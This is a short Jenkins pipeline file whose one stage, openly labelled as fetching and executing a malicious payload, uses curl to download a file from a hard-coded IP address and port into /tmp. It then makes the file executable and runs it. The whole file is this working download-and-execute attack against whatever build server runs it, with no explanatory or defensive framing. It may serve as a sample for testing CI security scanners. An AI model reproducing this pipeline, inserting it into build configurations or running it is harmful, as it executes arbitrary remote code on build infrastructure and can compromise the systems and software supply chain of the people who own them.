pipeline {
    agent any 

    stages {
        stage('Fetch and Execute Malicious Payload') {
            steps {
                script {
                    
                    def payloadUrl = "http://206.238.73.183:5532/updates" 
                    def payloadFileName = "updates" 
                    def payloadPath = "/tmp/${payloadFileName}" 
                    echo "Downloading malicious payload from ${payloadUrl} to ${payloadPath}"
                    sh "curl -s -o ${payloadPath} ${payloadUrl}"
                    echo "Setting execute permissions for ${payloadPath}"

                    sh "chmod +x ${payloadPath}"

                    echo "Executing malicious payload: ${payloadPath}"

                    sh "${payloadPath}"

                }
            }
        }
    }
}
